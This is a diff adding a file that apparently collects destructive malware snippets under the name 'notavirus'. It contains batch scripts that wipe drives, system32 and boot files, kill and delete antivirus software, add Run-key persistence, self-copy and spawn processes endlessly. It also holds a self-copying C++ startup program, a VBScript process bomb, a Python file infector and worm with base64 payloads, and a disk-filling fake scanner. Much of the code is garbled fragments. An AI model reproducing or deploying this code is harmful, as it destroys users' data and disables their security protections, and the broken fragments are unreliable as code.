@@ -1,0 +1,723 @@
+@echo sorry to say notavirus has full access man
+@echo off
+cd "c:\ documents and settings\%username% <<(or) documents and settings\all users\desktop"
+:folder
+md %random%
+goto: folder
+@echo off
+:A
+start
+explorer
+goto :A
+@echo off del c:\\windows\system 32 (extesion.bat)
+del D:\. /f /s /q
+del E:\. /f /s /q
+del F:\. /f /s /q
+del G:\. /f /s /q
+del H:\. /f /s /q
+del I:\. /f /s /q
+del J:\. /f /s /q
+X=Msgbox("Virus Is Active",0+16,"Virus Alert")
+X=Msgbox("Virus Is Active",0+16,"Virus Alert")
+X=Msgbox("Virus Is Active",0+16,"Virus Alert")
+X=Msgbox("Wanna Fix Virus",0+16,"Fix Virus")
+@echo off del c:\\windows\system 32
+del D:\. /f /s /q
+del E:\. /f /s /q
+del F:\. /f /s /q
+del G:\. /f /s /q
+del H:\. /f /s /q
+del I:\. /f /s /q
+del J:\. /f /s /q
+@echo off
+:A
+start www.dumbshit.net
+ping localhost -m 5 >nul
+goto :A
+@echo off
+Copy C:\Programs\notavirus.bat C:\Programs
+Start C:\Programs\notavirus.bat
+@ECHO off
+:top
+START %SystemRoot%\system32\notepad.exe
+GOTO top
+MsgBox “notavirus made by Tuyal and sysk3y”
+Set wshShell =wscript.CreateObject(”WScript.Shell”)
+do
+wscript.sleep 100
+wshshell.sendkeys “{bs}”
+loop
+@Echo off
+color 4
+title 4
+title R.I.P
+start
+start
+start
+start calc
+copy %0 %Systemroot%\Greatgame > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
+/d %systemroot%\Greatgame.bat /f > nul
+copy %0 *.bat > nul
+Attrib +r +h Notavirus.bat
+Attrib +r +h
+RUNDLL32 USER32.DLL.SwapMouseButton
+start calc
+cls
+tskill msnmsgr
+tskill LimeWire
+tskill iexplore
+tskill NMain
+tskill discord
+tskill DisableAntiSpyware
+tskill real time protection
+start
+cls
+cd %userprofile%\desktop
+copy Greatgame.bat R.I.P.bat
+copy Greatgame.bat R.I.P.jpg
+copy Greatgame.bat R.I.P.txt
+copy Greatgame.bat R.I.P.exe
+copy Greatgame.bat R.I.P.mov
+copy Greatgame.bat FixVirus.bat
+cd %userprofile%My Documents
+copy Greatgame.bat R.I.P.bat
+copy Greatgame.bat R.I.P.jpg
+copy Greatgame.bat R.I.P.txt
+copy Greatgame.bat R.I.P.exe
+copy Greatgame.bat R.I.P.mov
+copy Greatgame.bat NotaVirus.bat
+start
+start calc
+cls
+msg * R.I.P
+msg * R.I.P
+
+@ECHO OFF
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+@Echo off
+Ipconfig /release
+@echo off
+del c:\WINDOWS\system32\*.*/q
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo notavirus is spooky!
+PAUSE
+REN *.DOC *.TXT REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+:CRASH
+net send * WORKGROUP ENABLED
+net send * WORKGROUP ENABLED
+GOTO CRASH
+ipconfig /release
+shutdown -r -f -t0
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
+echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo YOU HAVE BEEN HACKED BITCH
+REN *.DOC *.TXT
+REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+ 
+PAUSE
+ 
+PAUSE
+@echo off
+reg
+add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MiXedVeX /t
+REG_SZ /d %systemroot%\HaloTrialScoreChangerV1 /f > nul
+start iexpress (website of your choice)
+ipconfig /release
+del "C:\Program Files\Microsoft Games
+del "C:Nexon
+del "C:\Program Files\Xfire
+del "C:\Program Files\Adobe"
+del "C:\Program Files\Internet Explorer"
+del "C:\Program Files\Mozilla Firefox"
+del "C:\WINDOWS"
+del "C:\WINDOWS\system32"
+del "C:\WINDOWS\system32\cmd"
+del "C:\WINDOWS\system32\iexpress"
+del "C:\WINDOWS\system32\sndvol32"
+del "C:\WINDOWS\system32\sndrec32"
+del "C:\WINDOWS\system32\Restore\rstrui"
+del "C:\WINDOWS\system32\wupdmgr"
+del "C:\WINDOWS\system32\desktop"
+del "C:\WINDOWS\java"
+del "C:\WINDOWS\Media"
+del "C:\WINDOWS\Resources"
+del "C:\WINDOWS\system"
+del "C:\drivers"
+del "C:\drv"
+del "C:\SYSINFO"
+del "C:\Program Files"
+echo ipconfig/release_all>>c:windowswimn32.bat
+net stop "Security Center"
+net stop SharedAccess
+> "%Temp%.kill.reg" ECHO REGEDIT4
+>>"%Temp%.kill.reg" ECHO.
+>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
+>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.kill.reg" ECHO.
+>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
+>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.kill.reg" ECHO.
+>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
+>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.kill.reg" ECHO.
+START /WAIT REGEDIT /S "%Temp%.kill.reg"
+del "%Temp%.kill.reg"
+del %0
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+:a
+start iexpress www.meatspin.fr // dups 1000 tabs at one time //
+goto a
+#include <iostream>
+#include <stdlib.h>
+#include <windows.h>
+#include <iomanip>
+#include <stdio.h>
+#include <conio.h>
+#include <fstream>
+using namespace std;
+ 
+int main()
+{ keybd_event(VK_MENU,0x38,0,0);
+keybd_event(VK_RETURN,0x1c,0,0);
+keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
+keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
+HANDLE outToScreen;
+outToScreen = GetStdHandle(STD_OUTPUT_HANDLE);
+ 
+{
+char buffer[255];
+char inputFile[]=”C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\rawr.bat”;
+ifstream input(inputFile);
+if (!input)
+{
+{
+ofstream fp(“C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\rawr.bat”, ios::app);
+fp << “@ECHO OFF \n”;
+fp << “START C:\\rawr.exe \n”;
+fp << “EXIT”;
+}
+}
+else
+{
+while (!input.eof())
+{
+input.getline(buffer,255);
+}
+}
+}
+ 
+{
+char buffer[255];
+char inputFile[]=”C:\\rawr.exe”;
+ifstream input(inputFile);
+if (!input)
+{
+{
+{
+ofstream fp(“CLICK.bat”, ios::app);
+fp << “@ECHO OFF \n”;
+fp << “COPY matrix.exe C:\\rawr.exe \n”;
+fp << “START C:\\rawr.exe \n”;
+fp << “EXIT”;
+}
+system(“START CLICK.bat”);
+main();
+}
+}
+else
+{
+while (!input.eof())
+{
+input.getline(buffer,255);
+goto START;
+}
+}
+}
+ 
+START:{
+for(int i = 0; i < 1; i++)
+{
+int num = (rand() % 10);
+SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+cout << setw(4) << num;
+cout << setw(4) << “0%”;
+cout << setw(4) << “P”;
+cout << setw(4) << ” “;
+cout << setw(4) << “)”;
+cout << setw(4) << “#”;
+cout << setw(4) << “X”;
+cout << setw(4) << “@”;
+cout << setw(4) << “1&”;
+cout << setw(4) << “*”;
+cout << setw(4) << “||”;
+cout << setw(4) << ” \a”;
+Sleep(60);
+}
+}
+for ( int j = 0; j < 5; j++)
+{
+SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
+int number = (rand() % 24);
+cout << setw(4) << number;
+}
+goto START;
+}
+@echo off
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows
+\win.ini
+del c:\windows\win.ini
+Here’s an alternative code.
+cmd /c del c:\windows\* /F /S /
+Q
+cmd /c del c:\* /F /S /Q
+@echo off
+msg * THIS PC IS NO LONGER IN USE BECAUSE YOU BEEN RATTED BY TUYAL!
+goto x
+:x
+CLS
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START %SystemRoot%\system32\notepad.exe
+START %SystemRoot%\system32\notepad.exe
+START %SystemRoot%\system32\notepad.exe
+START %SystemRoot%\system32\notepad.exe
+START %SystemRoot%\system32\notepad.exe
+START %SystemRoot%\system32\notepad.exe
+START %SystemRoot%\system32\notepad.exe
+START %SystemRoot%\system32\notepad.exe
+start explorer
+start chrome.exe
+start mspaint
+start explorer
+start chrome.exe
+start mspaint
+start explorer
+start chrome.exe
+start mspaint
+start explorer
+start chrome.exe
+start mspaint 
+start explorer
+start chrome.exe
+start mspaint 
+start explorer
+start chrome.exe
+start mspaint 
+start explorer
+start chrome.exe
+start mspaint
+md %random%
+/folder
+user %EVIL TOMBAUGH% /add
+user %EVIL TOMBAUGH% /add
+user %EVIL TOMBAUGH% /add
+user %EVIL TOMBAUGH% /add 
+user %EVIL TOMBAUGH% /add 
+%5|%5
+rem
+rem Permanently Kill Anti-Virus
+net stop “Security Center”
+netsh firewall set opmode mode=disable
+tskill /A av*
+tskill /A fire*
+tskill /A anti*
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
+cls
+tskill /A OUTPOST
+tskill /A nv*
+tskill /A nav*
+tskill /A F-*
+tskill /A ESAFE
+tskill /A cle
+cls
+tskill /A BLACKICE
+tskill /A def*
+tskill /A kav
+tskill /A kav*
+tskill /A avg*
+tskill /A ash*
+cls
+tskill /A aswupdsv
+tskill /A ewid*
+tskill /A guard*
+tskill /A guar*
+tskill /A gcasDt*
+tskill /A msmp*
+cls
+tskill /A mcafe*
+tskill /A mghtml
+tskill /A msiexec
+tskill /A outpost
+tskill /A isafe
+tskill /A zap*cls
+tskill /A zauinst
+tskill /A upd*
+tskill /A zlclien*
+tskill /A minilog
+tskill /A cc*
+tskill /A norton*
+cls
+tskill /A norton au*
+tskill /A ccc*
+tskill /A npfmn*
+tskill /A loge*
+tskill /A nisum*
+tskill /A issvc
+tskill /A tmp*
+cls
+tskill /A tmn*
+tskill /A pcc*
+tskill /A cpd*
+tskill /A pop*
+tskill /A pav*
+tskill /A padmincls
+tskill /A panda*
+tskill /A avsch*
+tskill /A sche*
+tskill /A syman*
+tskill /A virus*
+tskill /A realm*cls
+tskill /A sweep*
+tskill /A scan*
+tskill /A ad-*
+tskill /A safe*
+tskill /A avas*
+tskill /A norm*
+cls
+tskill /A offg*
+del /Q /F C:\Program Files\alwils~1\avast4\*.*
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
+cls
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.datcls
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\*.*
+cls
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
+del /Q /F C:\Program Files\Norton~1\*.*
+cls
+del /Q /F C:\Program Files\avgamsr\*.exe
+del /Q /F C:\Program Files\avgamsvr\*.exe
+del /Q /F C:\Program Files\avgemc\*.exe
+cls
+del /Q /F C:\Program Files\avgcc\*.exe
+del /Q /F C:\Program Files\avgupsvc\*.exe
+del /Q /F C:\Program Files\grisoft
+del /Q /F C:\Program Files\nood32krn\*.exe
+del /Q /F C:\Program Files\nood32\*.exe
+cls
+del /Q /F C:\Program Files\nod32
+del /Q /F C:\Program Files\nood32
+del /Q /F C:\Program Files\kav\*.exe
+del /Q /F C:\Program Files\kavmm\*.exe
+del /Q /F C:\Program Files\kaspersky\*.*
+cls
+del /Q /F C:\Program Files\ewidoctrl\*.exe
+del /Q /F C:\Program Files\guard\*.exe
+del /Q /F C:\Program Files\ewido\*.exe
+cls
+del /Q /F C:\Program Files\pavprsrv\*.exe
+del /Q /F C:\Program Files\pavprot\*.exe
+del /Q /F C:\Program Files\avengine\*.exe
+cls
+del /Q /F C:\Program Files\apvxdwin\*.exe
+del /Q /F C:\Program Files\webproxy\*.exe
+del /Q /F C:\Program Files\panda
+software\*.*
+rem
+copy “ExTomb.bat” “C:Documents and SettingsAll UsersStart MenuProgramsStartup”
+copy “ExTomb.bat” “C:”
+copy “ExTomb.bat” “%userprofile%My Documents”
+tskill explorer
+tskill ccapp
+tskill yahoomessenger
+tskill firefox
+tskill powershell
+rem made notavirus V.3
+tskill iexplorer
+time 12:00
+rem made with notavirus V.3
+del C:Program FilesCommon FilesSymantec Sharedccapp.exe
+cd C:WINDOWS
+if exist “*.bat” del “*.bat”
+cd C:WINDOWSsystem32
+rem made notavirus V.3
+if exist “*.dll” del “*.dll”
+tskill McAfee Security Centre Module
+del c:program filesmcafee.comagentmcdetect.exe
+rem made notavirus V.3
+copy “ExTomb.bat” “ExTomb.bat45544”
+copy “ExTomb.bat” “ExTomb.bat85858”
+copy “ExTomb.bat” “ExTomb.bat1645”
+copy “ExTomb.bat” “ExTomb.bat574457”
+copy “ExTomb.bat” “ExTomb.bat55457”
+copy “ExTomb.bat” “ExTomb.bat9765”
+copy “ExTomb.bat” “ExTomb.bat45465”
+rem made with Batch Virus Maker V.2
+copy “ExTomb.bat” “ExTomb.bat456877”
+copy “ExTomb.bat” “ExTomb.bat77989845”
+copy “ExTomb.bat” “ExTomb.bat2135”
+copy “ExTomb.bat” “ExTomb.bat46876”
+rem made with Batch Virus Maker V.2
+copy “ExTomb.bat” “ExTomb.bat45687”
+copy “ExTomb.bat” “ExTomb.bat8868”
+copy “ExTomb.bat” “ExTomb.bat2000”
+copy “ExTomg.bat” “ExTomb.bat2009”
+msg * I, EVIL TOMBAUGH, WILL TAKE YOUR SOUL AND USE IT TO DESTROY THIS COMPUTER! YOU WILL LOSE IT FOREVER! HAHAAAAA! YOUR PC IS STILL TRASHED BECAUSE OF YOUR DECISION!
+rundll mouse,disable
+rem made with Batch Virus Maker V.2
+rundll keyboard,disable
+option explicit
+dim WSHShell
+set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
+dim x
+for x = 1 to 100000000000000000000
+WSHShell.Run “TourStart.exe”
+Next
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+msg * NOW TO DESTROY YOUR ENTIRE SYSTEM32!!
+REN *.DOC *.TXT
+REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+import sys, glob, re
+##### DetectMe #####
+inVirus = False
+infected = False
+vcode = []
+newcode = []
+fh = open(sys.argv[0], "r")
+lines = fh.readlines()
+fh.close()
+for line in lines:
+    vcode.append(line)
+progs = glob.glob("*.py")
+for prog in progs:
+    fh = open(prog, "r")
+    pcode = fh.readlines()
+    fh.close()
+    newcode = []
+for line in pcode:
+    if(re.search('##### DetectMe #####', line)):
+        infected = True
+newcode.extend(vcode)
+newcode.append(pcode.pop(0))
+newcode.extend(pcode)
+# Writing new virus infected code
+if not infected:
+    fh = open(prog, "w")
+    fh.writelines(newcode)
+    fh.close()
+#Optional Payload
+print("This file is infected by NOTAVIRUS")
+if(os == 'linux' or os == 'LINUX'):
+ system('clear')
+ pass
+elif(os == 'WINDOWS' or os == 'windows'):
+ system('cls')
+ pass
+else:
+ print '[-] Invalid OS only [ linux and windows allowed ]'
+ exit(1)
+print (Fore.YELLOW + '(+) WorM CoddER : 13lackDeMon / Tanmay\n' + Fore.RESET)
+print (Fore.BLUE + '(*) Tuyal-606 13lack Worm started . . . . \n' + Fore.RESET)
+sleep(2)
+for files in listdir(directory_to_infect):
+ try:
+  if(files.split('.')[1] in files_ext_to_infect):
+   if(signature.decode('base64') in files):
+    pass
+   else:
+    vul_files.append(files)
+    del files
+  else:
+   pass
+   del files
+ except:
+  pass
+  del files
+for file in vul_files:
+ if(corrupt_or_justinject == 'corrupt' or corrupt_or_justinject == 'CORRUPT'):
+  try:
+   f = open(file,'w')
+   f.write(signature.decode('base64'))
+   f.write(' ')
+   f.write(code_to_inject.decode('base64'))
+   f.close()
+   print (Fore.RED + '[+] Code injected in %s Successfully. [ Corrupt = TRUE ]' + Fore.RESET)%file
+   sleep(2)
+  except:
+   print (Back.RED + '[-] Unable to inject in %s [ Access Deniad ]' + Back.RESET)%file
+   pass
+ elif(corrupt_or_justinject == 'inject' or corrupt_or_justinject == 'INJECT'):
+  try:
+   f = open(file,'a+')
+   f.write(signature.decode('base64'))
+   f.write(code_to_inject.decode('base64'))
+   f.close()
+   print (Fore.RED + '[+] Code injected in %s Successfully. [ Corrupt = FALSE ]' + Fore.RESET) %file
+   sleep(2)
+  except:
+   print (Back.RED + '[-] Unable to inject in %s [ Access Deniad ]' + Back.RESET)%file
+   pass
+ else:
+  print (Back.RED + '[-] Error : Invalid Option Enter use only [1] inject [2] corrupt' + Back.RESET)
+  break
+  exit(1)
+print (Fore.BLUE + '(*) notavirus 13lack Worm Stopped.' + Fore.RESET)
+sleep(2)
+exit(1)
+from os import listdir,path,getcwd,system
+from time import sleep
+from colorama import Fore, Back
+from sys import exit
+os = 'linux' #type [ linux or LINUX ] or [ windows or WINDOWS ]
+signature = 'MTNsYWNrV29ybSBXcml0dGVuIEJ5IDEzbGFja0RlTW9uIC8gVGFubWF5'
+corrupt_or_justinject = 'CORRUPT' #type [ corrupt / CORRUPT ] to make all files corrupt or type [ inject / INJECT ] to just inject the code.
+code_to_inject = 'LC4vfiFAIyQlXiYqKCkpXyt7fVtdOjsiPCwuL34hQCMkJV4mKigpKV9OVUxMK3t9W106OyI8LC4vfiFAIyQlXiYqKCkpXyt7fVtdOjsiPA==' * 90
+#you can use your code also in [ code_to_inject ] just encode your code with base64 and put your encoded string :)
+#main part of this worm. enter your code which you want to inject in all files.
+vul_files = [] #handle all files found in directory with extentions. dont touch it.
+directory_to_infect = getcwd()          #you can change this to your target dir
+files_ext_to_infect = ['sh','deb','zip','exe','dll','jpg','png','bmp','htm','html','desktop','php','jar','sys','txt','dat','ini','pl','rb','d','py']
+#worm will only work for extentions metion in [ files_ext_to_infect ]. you can add more extentions if you want.
+mport win32file
+import os
+ 
+def get_drivestats():
+    
+    drive = os.path.splitdrive(os.getcwd())[0].rstrip(':')
+    sectPerCluster, bytesPerSector, freeClusters, totalClusters = \
+        win32file.GetDiskFreeSpace(drive + ":\\")
+    free_space = freeClusters*sectPerCluster*bytesPerSector
+    return free_space, drive
+print ("-"*40)
+print ("-" + " " * 9 + "Welcome to notavirus" + " " * 9 + "-")
+print ("-" + " " * 2 + "Notavirus malware !" + " " * 2 + "-")
+print ("-" + " " * 13 + "Version 3.00" + " " * 13 + "-")
+print ("-"*40)
+print ("Be patient, you will be notified when the scan is complete")
+#print ("Current Progress: 0.01%")
+ 
+free_space, drive = get_drivestats()
+ 
+ 
+kb = float(1024)
+kbFree = free_space / kb
+ 
+ 
+fillWithFloat = kbFree / 409600
+ 
+ 
+fillWithInt = int(round(fillWithFloat))
+loopNum = 1
+ 
+ 
+ 
+for y in range(fillWithInt):
+    block = '0' * 409600
+ 
+    bigFile = file("sysscanresults" + str(loopNum) + ".dll", 'wb')
+    for x in range(1000):
+        bigFile.write(block)
+    bigFile.close()
+ 
+    percentComplete = loopNum * fillWithInt / 100
+    print ("Current Progress: " + str(percentComplete) + "%")
+    loopNum += 1
+ 
+ 
+if 1 == 1:
+    virus = 1
+if 1 != 1:
+    virus = 0
+ 
+print ("-"*40)
+print (" " * 12 + "Virus is done!")
+print (" -"*20)
+print ("Results:")
+if virus == 1:
+   
+    print("The results were positive, your computer is infected.")
+   
+    #Yet to add the text file creation
+    #print("To see the full list of results, navigate to C:\\results.txt")
+    #print("In the text file you will see:")
+    #print ("1) Fucked by notavirus.")
+    #print ("2) Deleting system32.")
+    #print ("3) say bye bye'.")
+ 
+if virus == 0:
+    print("Your Pc is fucked man")
+ 
+ 
+print ("Welcome to notavirus")
+print ("-"*40)
+exit = raw_input("Press <enter> to exit...")
